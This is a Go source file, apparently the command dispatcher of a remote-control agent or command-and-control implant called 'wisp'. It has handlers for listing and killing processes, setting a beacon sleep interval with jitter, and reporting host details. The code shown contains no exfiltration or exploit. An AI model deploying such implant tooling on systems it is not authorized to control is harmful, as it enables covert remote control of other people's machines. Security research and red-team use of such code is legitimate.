package commands

import (
	"encoding/json"
	"fmt"
	"os"
	"strconv"
	"strings"

	"github.com/user/wisp/shared/protocol"
)

func (d *Dispatcher) execPs() string {
	return listProcesses()
}

func (d *Dispatcher) execKill(argsJSON string) string {
	var args map[string]string
	json.Unmarshal([]byte(argsJSON), &args)

	pidStr := args["pid"]
	if pidStr == "" {
		return "error: no PID specified"
	}

	pid, err := strconv.Atoi(pidStr)
	if err != nil {
		return fmt.Sprintf("error: invalid PID: %s", pidStr)
	}

	proc, err := os.FindProcess(pid)
	if err != nil {
		return fmt.Sprintf("error: %v", err)
	}

	if err := proc.Kill(); err != nil {
		return fmt.Sprintf("error: %v", err)
	}

	return fmt.Sprintf("process %d killed", pid)
}

// listProcesses is platform-specific, implemented below for simplicity
// using /bin/ps on unix and tasklist on windows
func listProcesses() string {
	return listProcessesPlatform()
}

func (d *Dispatcher) execSleep(argsJSON string) string {
	var args map[string]string
	if err := json.Unmarshal([]byte(argsJSON), &args); err != nil {
		return "error: invalid sleep args: " + err.Error()
	}

	sleepStr := strings.TrimSpace(args["sleep"])
	jitterStr := strings.TrimSpace(args["jitter"])

	sleep := 5000
	jitter := 0

	// Fail loudly on malformed values instead of silently keeping the default:
	// a bad sleep command used to look like it "did nothing" while the agent
	// stayed on its old interval.
	if sleepStr != "" {
		v, err := strconv.Atoi(sleepStr)
		if err != nil {
			return "error: invalid sleep value: " + sleepStr + " (expect milliseconds)"
		}
		if v < protocol.MinSleepMS {
			return fmt.Sprintf("error: sleep too small: %d ms (minimum %d ms)", v, protocol.MinSleepMS)
		}
		sleep = v
	}
	if jitterStr != "" {
		v, err := strconv.Atoi(jitterStr)
		if err != nil || v < 0 || v > protocol.MaxJitterPct {
			return fmt.Sprintf("error: invalid jitter value: %s (expect 0-%d%%)", jitterStr, protocol.MaxJitterPct)
		}
		jitter = v
	}

	if d.OnSleep != nil {
		d.OnSleep(sleep, jitter)
	}

	return fmt.Sprintf("sleep=%dms (%.2fs) jitter=%d%%", sleep, float64(sleep)/1000.0, jitter)
}

func (d *Dispatcher) execSysinfo() string {
	hostname, _ := os.Hostname()
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("Hostname: %s\n", hostname))
	sb.WriteString(fmt.Sprintf("PID: %d\n", os.Getpid()))
	sb.WriteString(getSysInfo())
	return strings.TrimRight(sb.String(), "\n")
}
